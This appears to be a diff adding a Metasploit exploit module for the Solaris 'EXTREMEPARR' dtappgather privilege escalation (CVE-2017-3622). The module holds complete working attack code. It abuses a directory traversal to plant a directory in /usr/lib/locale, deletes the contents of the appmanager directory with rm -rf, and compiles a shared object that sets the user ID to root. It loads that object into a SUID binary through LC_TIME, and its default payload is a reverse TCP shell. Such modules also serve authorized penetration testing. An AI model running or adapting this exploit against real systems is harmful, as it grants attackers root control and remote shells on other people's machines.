@@ -1,0 +1,238 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Post::File
+  include Msf::Post::Solaris::Priv
+  include Msf::Post::Solaris::System
+  include Msf::Post::Solaris::Kernel
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => "Solaris 'EXTREMEPARR' dtappgather Privilege Escalation",
+      'Description'    => %q{
+        This module exploits a directory traversal vulnerability in the
+        `dtappgather` executable included with Common Desktop Environment (CDE)
+        on unpatched Solaris systems prior to Solaris 10u11 which allows users
+        to gain root privileges.
+
+        dtappgather allows users to create a user-owned directory at any
+        location on the filesystem using the `DTUSERSESSION` environment
+        variable.
+
+        This module creates a directory in `/usr/lib/locale`, writes a shared
+        object to the directory, and runs the specified SUID binary with the
+        shared object loaded using the `LC_TIME` environment variable.
+
+        This module has been tested successfully on:
+
+        Solaris 9u7 (09/04) (x86);
+        Solaris 10u1 (01/06) (x86);
+        Solaris 10u2 (06/06) (x86);
+        Solaris 10u4 (08/07) (x86);
+        Solaris 10u8 (10/09) (x86);
+        Solaris 10u9 (09/10) (x86).
+      },
+      'References'     =>
+        [
+          ['BID', '97774'],
+          ['CVE', '2017-3622'],
+          ['EDB', '41871'],
+          ['URL', 'https://github.com/HackerFantastic/Public/blob/master/exploits/dtappgather-poc.sh'],
+          ['URL', 'http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html']
+        ],
+      'Notes'          => { 'AKA' => ['EXTREMEPARR'] },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Shadow Brokers',   # exploit
+          'Hacker Fantastic', # dtappgather-poc.sh
+          'Brendan Coles'     # Metasploit
+        ],
+      'DisclosureDate' => 'Apr 24 2017',
+      'Privileged'     => true,
+      'Platform'       => ['solaris', 'unix'],
+      'Arch'           => [ARCH_X86, ARCH_X64, ARCH_SPARC],
+      'Targets'        => [['Auto', {}]],
+      'SessionTypes'   => ['shell', 'meterpreter'],
+      'DefaultOptions' =>
+        {
+          'PAYLOAD'     => 'solaris/x86/shell_reverse_tcp',
+          'WfsDelay'    => 10,
+          'PrependFork' => true
+        },
+      'DefaultTarget'  => 0))
+    register_options [
+      # Some useful example SUID executables:
+      # * /usr/bin/at
+      # * /usr/bin/cancel
+      # * /usr/bin/chkey
+      # * /usr/bin/lp
+      # * /usr/bin/lpset
+      # * /usr/bin/lpstat
+      # * /usr/lib/lp/bin/netpr
+      # * /usr/sbin/lpmove
+      OptString.new('SUID_PATH', [true, 'Path to suid executable', '/usr/bin/at']),
+      OptString.new('DTAPPGATHER_PATH', [true, 'Path to dtappgather executable', '/usr/dt/bin/dtappgather'])
+    ]
+    register_advanced_options [
+      OptBool.new('ForceExploit',  [false, 'Override check result', false]),
+      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
+    ]
+  end
+
+  def suid_bin_path
+    datastore['SUID_PATH']
+  end
+
+  def dtappgather_path
+    datastore['DTAPPGATHER_PATH']
+  end
+
+  def mkdir(path)
+    vprint_status "Creating directory '#{path}'"
+    cmd_exec "mkdir -p '#{path}'"
+    register_dir_for_cleanup path
+  end
+
+  def upload(path, data)
+    print_status "Writing '#{path}' (#{data.size} bytes) ..."
+    rm_f path
+    write_file path, data
+    register_file_for_cleanup path
+  end
+
+  def upload_and_compile(path, data)
+    upload "#{path}.c", data
+
+    output = cmd_exec "PATH=$PATH:/usr/sfw/bin/:/opt/sfw/bin/:/opt/csw/bin gcc -fPIC -shared -g -lc -o #{path} #{path}.c"
+    unless output.blank?
+      print_error output
+      fail_with Failure::Unknown, "#{path}.c failed to compile"
+    end
+
+    register_file_for_cleanup path
+  end
+
+  def symlink(link_target, link_name)
+    vprint_status "Symlinking #{link_target} to #{link_name}"
+    rm_f link_name
+    cmd_exec "ln -sf #{link_target} #{link_name}"
+    register_file_for_cleanup link_name
+  end
+
+  def check
+    [dtappgather_path, suid_bin_path].each do |path|
+      unless setuid? path
+        vprint_error "#{path} is not setuid"
+        return CheckCode::Safe
+      end
+      vprint_good "#{path} is setuid"
+    end
+
+    unless has_gcc?
+      vprint_error 'gcc is not installed'
+      return CheckCode::Safe
+    end
+    vprint_good 'gcc is installed'
+
+    version = kernel_release
+    if version.to_s.eql? ''
+      vprint_error 'Could not determine Solaris version'
+      return CheckCode::Detected
+    end
+
+    unless Gem::Version.new(version).between? Gem::Version.new('5.7'), Gem::Version.new('5.10')
+      vprint_error "Solaris version #{version} is not vulnerable"
+      return CheckCode::Safe
+    end
+    vprint_good "Solaris version #{version} appears to be vulnerable"
+
+    CheckCode::Appears
+  end
+
+  def exploit
+    if is_root?
+      fail_with Failure::BadConfig, 'Session already has root privileges'
+    end
+
+    unless [CheckCode::Detected, CheckCode::Appears].include? check
+      unless datastore['ForceExploit']
+        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
+      end
+      print_warning 'Target does not appear to be vulnerable'
+    end
+
+    unless writable? datastore['WritableDir']
+      fail_with Failure::BadConfig, "#{datastore['WritableDir']} is not writable"
+    end
+
+    # Remove appmanager directory and contents
+    appmanager_path = '/var/dt/appconfig/appmanager'
+    vprint_status "Cleaning appmanager directory #{appmanager_path}"
+    cmd_exec "chmod -R 755 #{appmanager_path}/*"
+    cmd_exec "rm -rf #{appmanager_path}/*"
+    rm_f appmanager_path
+
+    # Create writable directory in /usr/lib/locale
+    locale_path = '/usr/lib/locale'
+    locale_name = rand_text_alphanumeric 5..10
+    new_dir = "#{locale_path}/#{locale_name}"
+    vprint_status "Creating directory #{new_dir}"
+    depth = 3
+    cmd_exec "DTUSERSESSION=. /usr/dt/bin/dtappgather"
+    depth.times do
+      cmd_exec "DTUSERSESSION=.. /usr/dt/bin/dtappgather"
+    end
+    symlink locale_path, appmanager_path
+    cmd_exec "DTUSERSESSION=#{locale_name} #{dtappgather_path}"
+    unless cmd_exec("ls -al #{locale_path} | grep #{locale_name}").to_s.include? locale_name
+      fail_with Failure::NotVulnerable, "Could not create directory #{new_dir}"
+    end
+
+    print_good "Created directory #{new_dir}"
+    register_dir_for_cleanup new_dir
+
+    rm_f appmanager_path
+    cmd_exec "chmod 755 #{new_dir}"
+
+    # Upload and compile shared object
+    base_path = "#{datastore['WritableDir']}/.#{rand_text_alphanumeric 5..10}"
+    mkdir base_path
+
+    payload_name = ".#{rand_text_alphanumeric 5..10}"
+    payload_path = "#{base_path}/#{payload_name}"
+
+    so = <<-EOF
+      void __attribute__((constructor)) cons() {
+        setuid(0);
+        setgid(0);
+        execle("#{payload_path}", "", 0, 0);
+        _exit(0);
+      }
+    EOF
+
+    so_name = ".#{rand_text_alphanumeric 5..10}"
+    so_path = "#{base_path}/#{so_name}"
+    upload_and_compile so_path, so
+
+    vprint_status "Writing shared objects to #{new_dir}"
+    cmd_exec "cp '#{so_path}' '#{new_dir}/#{locale_name}.so.2'"
+    register_file_for_cleanup "#{new_dir}/#{locale_name}.so.2"
+    cmd_exec "cp '#{so_path}' '#{new_dir}/#{locale_name}.so.3'"
+    register_file_for_cleanup "#{new_dir}/#{locale_name}.so.3"
+
+    # Upload and execute payload
+    upload payload_path, generate_payload_exe
+    cmd_exec "chmod +x #{payload_path}"
+
+    print_status 'Executing payload...'
+    cmd_exec "LC_TIME=#{locale_name} #{suid_bin_path} & echo "
+  end
+end
